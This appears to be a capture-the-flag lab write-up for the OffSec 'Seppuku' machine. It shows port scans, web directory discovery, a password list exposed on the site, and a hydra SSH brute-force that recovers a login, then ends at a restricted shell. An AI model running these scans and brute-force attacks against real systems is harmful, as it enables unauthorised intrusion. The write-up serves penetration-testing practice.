```
> rustscan -b 1000 -u 5000 -r 0-65535 -a 192.168.241.90 -- -Pn
```
```
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.241.90:21
Open 192.168.241.90:22
Open 192.168.241.90:80
Open 192.168.241.90:139
Open 192.168.241.90:445
Open 192.168.241.90:7080
Open 192.168.241.90:7601
Open 192.168.241.90:8088
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-01 00:45 EDT
Initiating Parallel DNS resolution of 1 host. at 00:45
Completed Parallel DNS resolution of 1 host. at 00:45, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 00:45
Scanning 192.168.241.90 [8 ports]
Discovered open port 22/tcp on 192.168.241.90
Discovered open port 21/tcp on 192.168.241.90
Discovered open port 139/tcp on 192.168.241.90
Discovered open port 80/tcp on 192.168.241.90
Discovered open port 445/tcp on 192.168.241.90
Discovered open port 7080/tcp on 192.168.241.90
Discovered open port 8088/tcp on 192.168.241.90
Discovered open port 7601/tcp on 192.168.241.90
Completed Connect Scan at 00:45, 0.75s elapsed (8 total ports)
Nmap scan report for 192.168.241.90
Host is up, received user-set (0.75s latency).
Scanned at 2023-11-01 00:45:24 EDT for 1s

PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack
22/tcp   open  ssh          syn-ack
80/tcp   open  http         syn-ack
139/tcp  open  netbios-ssn  syn-ack
445/tcp  open  microsoft-ds syn-ack
7080/tcp open  empowerid    syn-ack
7601/tcp open  unknown      syn-ack
8088/tcp open  radan-http   syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.78 seconds
```

```
> rustscan -u 5000 -p 21,22,80,139,445,7080,7601,8088 -a 192.168.241.90 -- -Pn -sCV
```
```
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.241.90:21
Open 192.168.241.90:22
Open 192.168.241.90:80
Open 192.168.241.90:139
Open 192.168.241.90:445
Open 192.168.241.90:7080
Open 192.168.241.90:7601
Open 192.168.241.90:8088
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-01 00:46 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:46
Completed NSE at 00:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:46
Completed NSE at 00:46, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:46
Completed NSE at 00:46, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 00:46
Completed Parallel DNS resolution of 1 host. at 00:46, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 00:46
Scanning 192.168.241.90 [8 ports]
Discovered open port 22/tcp on 192.168.241.90
Discovered open port 139/tcp on 192.168.241.90
Discovered open port 80/tcp on 192.168.241.90
Discovered open port 21/tcp on 192.168.241.90
Discovered open port 445/tcp on 192.168.241.90
Discovered open port 7080/tcp on 192.168.241.90
Discovered open port 8088/tcp on 192.168.241.90
Discovered open port 7601/tcp on 192.168.241.90
Completed Connect Scan at 00:46, 0.15s elapsed (8 total ports)
Initiating Service scan at 00:46
Scanning 8 services on 192.168.241.90
Completed Service scan at 00:47, 25.84s elapsed (8 services on 1 host)
NSE: Script scanning 192.168.241.90.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:47
Completed NSE at 00:47, 8.38s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:47
Completed NSE at 00:47, 2.23s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:47
Completed NSE at 00:47, 0.00s elapsed
Nmap scan report for 192.168.241.90
Host is up, received user-set (0.15s latency).
Scanned at 2023-11-01 00:46:55 EDT for 37s

PORT     STATE SERVICE       REASON  VERSION
21/tcp   open  ftp           syn-ack vsftpd 3.0.3
22/tcp   open  ssh           syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:55:a8:e4:0f:28:bc:b2:a6:7d:41:76:bb:9f:71:f4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhKnaNVJ/YnScPD1GDZSIfyC/a4jjHhSnoEgi2c/c03kE4JVZbA4cTFeEHGq4PFTyiuchv9w9zNu8XtVIDhILb9K4D38EssujmpekrrAnYkS0yU8Kqas1+3FCY8xjz6a5yVdMk/aQVa4BfFXWnv+rdlio0ZFVdLDaRaG90KMUEVw18Ogzt9lBbnbf7gOR0EGPKW0xzyDyI70u5FJnarDFV9jCZL/flcCL0m+MAycgdFyFqCOTjNxd8Qn2R3rnhgjSER5C9c+qEI/htLmtnXTC0p6AMeTDjO3J57LEB1WFYJ4wkeuEUtPadfhwgDR16XqWmqw2HcBIj1W9H9V47KFfR
|   256 16:fa:29:e4:e0:8a:2e:7d:37:d2:6f:42:b2:dc:e9:22 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC+yj9GRgyn2boC7Dw9un6PEwviM8NZ1CRTjmrHRFiOT+0co+OOwxD5RRQCxuS22zJgsiDIEka8ypTjYWlnJ9T8=
|   256 bb:74:e8:97:fa:30:8d:da:f9:5c:99:f0:d9:24:8a:d5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIESejQ038eElmlRfbqAgaRSK120jvrz9WQ5UcjxJdJ71
80/tcp   open  http          syn-ack nginx 1.14.2
|_http-server-header: nginx/1.14.2
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted Content
|_http-title: 401 Authorization Required
139/tcp  open  netbios-ssn   syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open                syn-ack Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
7080/tcp open  ssl/empowerid syn-ack LiteSpeed
|_http-server-header: LiteSpeed
| tls-alpn: 
|   h2
|   spdy/3
|   spdy/2
|_  http/1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Did not follow redirect to https://192.168.241.90:7080/
| ssl-cert: Subject: commonName=seppuku/organizationName=LiteSpeedCommunity/stateOrProvinceName=NJ/countryName=US/localityName=Virtual/emailAddress=mail@seppuku/dnQualifier=openlitespeed/initials=CP/name=openlitespeed/organizationalUnitName=Testing
| Issuer: commonName=seppuku/organizationName=LiteSpeedCommunity/stateOrProvinceName=NJ/countryName=US/localityName=Virtual/emailAddress=mail@seppuku/dnQualifier=openlitespeed/initials=CP/name=openlitespeed/organizationalUnitName=Testing
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-13T06:51:35
| Not valid after:  2022-08-11T06:51:35
| MD5:   2002:61c4:9f2d:6bfa:21d1:477c:21d9:e703
| SHA-1: e44a:c855:93ba:b3f8:b2f3:7ce5:db7f:a350:2f49:c7ca
| -----BEGIN CERTIFICATE-----
| MIIENTCCAx2gAwIBAgIUTA/1/lqL0wXtcQz9EwctzIvjfkYwDQYJKoZIhvcNAQEL
| BQAwgccxEDAOBgNVBAMMB3NlcHB1a3UxCzAJBgNVBAYTAlVTMRAwDgYDVQQHDAdW
| aXJ0dWFsMRswGQYDVQQKDBJMaXRlU3BlZWRDb21tdW5pdHkxEDAOBgNVBAsMB1Rl
| c3RpbmcxCzAJBgNVBAgMAk5KMRswGQYJKoZIhvcNAQkBFgxtYWlsQHNlcHB1a3Ux
| FjAUBgNVBCkMDW9wZW5saXRlc3BlZWQxCzAJBgNVBCsMAkNQMRYwFAYDVQQuEw1v
| cGVubGl0ZXNwZWVkMB4XDTIwMDUxMzA2NTEzNVoXDTIyMDgxMTA2NTEzNVowgccx
| EDAOBgNVBAMMB3NlcHB1a3UxCzAJBgNVBAYTAlVTMRAwDgYDVQQHDAdWaXJ0dWFs
| MRswGQYDVQQKDBJMaXRlU3BlZWRDb21tdW5pdHkxEDAOBgNVBAsMB1Rlc3Rpbmcx
| CzAJBgNVBAgMAk5KMRswGQYJKoZIhvcNAQkBFgxtYWlsQHNlcHB1a3UxFjAUBgNV
| BCkMDW9wZW5saXRlc3BlZWQxCzAJBgNVBCsMAkNQMRYwFAYDVQQuEw1vcGVubGl0
| ZXNwZWVkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA8SVGtfXTfTSO
| N6Umrvf+GIwkhWZe0KJ37rASVks61rn4yIVuQNzQwDWDBuw1IZD9SHnWWm8ejHmb
| M84sP4n9OCJYlnWrjFfAouH3IFku40Zx9JyVkGTeNA3HrFNN7WkX6yq2wHDHTqn+
| SeEX9pax9RAk1mm+DZBfZGqkkiZCu/IO2Ro1kHYTnlnvQmj1y07RkdcumVyVNZzi
| qJxrIZSl7EIUMEQfmkaX8RYigcfn6RsFkFdWPZ9JanNTBVBNrZptegtW6zH/R/Gu
| CUk7nbzqDm0u6Cs+6IWwENDkfELUBFkEW0rrDFxYhhJ1NmPa3bnLRYuU8RxGiVyN
| 9BEXNFg1rwIDAQABoxcwFTATBgNVHSUEDDAKBggrBgEFBQcDATANBgkqhkiG9w0B
| AQsFAAOCAQEA1n5K+UR3K91RltYeVilcq5/ynOHQiDrUZ5zi+/ZmYIUpoOakXzHv
| Pz8+gOSQ8fLch1ZUtkkAv8i5zaYJZ/WDMs4V6R80h9w9NOANKNOPCrWB1jWteBGG
| OSGn2Wbd4Ii0rKYFfmxoEags6MRklyFXE0rQoSlgUFsIQaPiisjv2xnm0GgoVmS8
| tUfRimAXsoBLgl5ZzT56MlfX5QSrqYy6UAtBeIc7R4C7lWcpay91b8JCXsGspjfX
| OBnzFQJ3tuMvtsDWD1NBPGWH5LpWRiaLalyz63KvWKdD3pr/5l2OKgU49qOVU/lQ
| NLEdNCP2sRzfHH/lXlwPhsm5MEtbf5tDKg==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
7601/tcp open  http          syn-ack Apache httpd 2.4.38 ((Debian))
|_http-title: Seppuku
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
8088/tcp open  http          syn-ack LiteSpeed httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: LiteSpeed
|_http-title: Seppuku
Service Info: Host: SEPPUKU; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 59629/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 44639/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 56090/udp): CLEAN (Timeout)
|   Check 4 (port 23622/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: seppuku
|   NetBIOS computer name: SEPPUKU\x00
|   Domain name: \x00
|   FQDN: seppuku
|_  System time: 2023-11-01T00:47:24-04:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-11-01T04:47:26
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h20m01s, deviation: 2h18m34s, median: 0s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:47
Completed NSE at 00:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:47
Completed NSE at 00:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:47
Completed NSE at 00:47, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.85 seconds
```

```
http://192.168.241.90
```
![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/1af3f6b0-6dba-4a6a-b2a0-ca83790ab652)

```
http://192.168.241.90:7601
```
![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/f8680f19-335f-45da-8bc1-c3f29456fc3d)

```
http://192.168.241.90:8088
```
![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/6d6217d7-0859-41f2-a7a6-db2195d053cc)

Content Discovery
```
> feroxbuster -u http://192.168.241.90:7601 -w /usr/share/seclists/Discovery/Web-Content/common.txt --no-recursion --dont-extract-links --random-agent --filter-status 404 --redirects
```
```
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.241.90:7601
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 📍  Follow Redirects      │ true
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      281c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        8l       15w      171c http://192.168.241.90:7601/
200      GET       15l       49w      735c http://192.168.241.90:7601/a/
200      GET       15l       49w      735c http://192.168.241.90:7601/b/
200      GET       15l       49w      735c http://192.168.241.90:7601/c/
200      GET      130l      571w     7244c http://192.168.241.90:7601/ckeditor/
200      GET       15l       49w      735c http://192.168.241.90:7601/d/
200      GET       15l       49w      749c http://192.168.241.90:7601/database/
200      GET       15l       49w      735c http://192.168.241.90:7601/e/
200      GET       15l       49w      735c http://192.168.241.90:7601/f/
200      GET       15l       49w      735c http://192.168.241.90:7601/h/
200      GET        8l       15w      171c http://192.168.241.90:7601/index.html
200      GET       17l       69w     1139c http://192.168.241.90:7601/keys/
200      GET      349l     1402w    16697c http://192.168.241.90:7601/production/
200      GET       15l       49w      735c http://192.168.241.90:7601/q/
200      GET       15l       49w      735c http://192.168.241.90:7601/r/
200      GET       20l      102w     1745c http://192.168.241.90:7601/secret/
200      GET       15l       49w      735c http://192.168.241.90:7601/t/
200      GET       16l       60w      940c http://192.168.241.90:7601/w/
[####################] - 16s     4724/4724    0s      found:18      errors:0      
[####################] - 16s     4724/4724    300/s   http://192.168.241.90:7601/ 
```

```
http://192.168.241.90:7601/keys/
```
![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/c38716b3-096d-4302-b707-bdf72316a136)

```
http://192.168.241.90:7601/keys/private
```
![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/3a22994a-a858-4721-9be4-9f2e94788019)

```
http://192.168.241.90:7601/secret/
```
![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/cbf076e3-1854-4e49-958c-3692efd4495b)

```
http://192.168.241.90:7601/secret/hostname
```
![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/119b98c7-9e92-4550-a8ca-b4429df39138)

```
http://192.168.241.90:7601/secret/password.lst
```
```
123456
12345
password
password1
123456789
12345678
1234567890
abc123
computer
tigger
1234
qwerty
money
carmen
mickey
secret
summer
internet
a1b2c3
123
service
canada
hello
ranger
shadow
baseball
donald
harley
hockey
letmein
maggie
mike
mustang
snoopy
buster
dragon
jordan
michael
michelle
mindy
patrick
123abc
andrew
bear
calvin
changeme
diamond
withme
withyou
matthew
miller
tiger
trustno1
alex
apple
avalon
brandy
chelsea
coffee
falcon
freedom
gandalf
green
helpme
linda
magic
merlin
newyork
soccer
thomas
wizard
asdfgh
bandit
batman
boris
butthead
dorothy
eeyoree
fishing
Football
george
happy
iloveyou
jennifer
jonathan
love
marina
master
missy
monday
monkey
natasha
```

SSH Password Brute-Force
```
> hydra -l seppuku -P passwords.txt 192.168.241.90 ssh
```
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-01 02:16:36
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 92 login tries (l:1/p:92), ~6 tries per task
[DATA] attacking ssh://192.168.241.90:22/
[22][ssh] host: 192.168.241.90   login: seppuku   password: eeyoree
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-11-01 02:17:31
```
![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/2ad36b57-2228-4644-8f42-5960d435659f)

SSH as Seppuku
```
> ssh seppuku@192.168.241.90
```
![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/c9649a00-f12b-438b-99d3-a5a437aefe9b)

Restricted `rbash`
